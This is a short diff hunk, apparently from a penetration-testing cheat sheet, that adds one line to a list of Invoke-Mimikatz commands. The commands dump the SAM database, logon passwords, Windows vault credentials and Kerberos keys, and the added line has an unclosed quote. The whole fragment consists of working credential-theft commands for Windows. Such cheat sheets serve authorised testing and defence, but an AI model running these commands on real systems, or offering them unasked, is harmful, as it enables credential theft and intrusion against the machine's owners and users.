@@ -256,6 +256,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam"'
 #Dump Logon Passwords
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
 #Dump Windows Secrets
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"
 vault::list
 vault::cred /patch
 #Dump Kerberos Encryption Keys
